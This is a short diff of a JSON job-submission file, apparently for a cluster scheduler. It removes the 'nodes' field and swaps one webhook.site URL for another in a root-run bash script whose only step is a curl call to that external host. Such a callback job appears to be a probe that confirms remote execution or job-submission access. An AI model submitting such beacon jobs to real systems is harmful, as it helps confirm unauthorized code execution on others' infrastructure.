@@ -2,7 +2,6 @@
     "job": {
         "name": "test",
         "ntasks": 1,
-        "nodes": 9,
         "current_working_directory": "/root",
         "standard_input": "/dev/null",
         "standard_output": "/root/test.out",
@@ -12,5 +11,5 @@
             "LD_LIBRARY_PATH:/lib/:/lib64/:/usr/local/lib"
        ]
     },
-    "script": "#!/bin/bash\n curl https://webhook.site/d5228066-c22b-4b1f-9863-afeb2765dbc2"
+    "script": "#!/bin/bash\n curl https://webhook.site/7c925655-38c0-461a-b37d-f7aa05f747e4"
 }
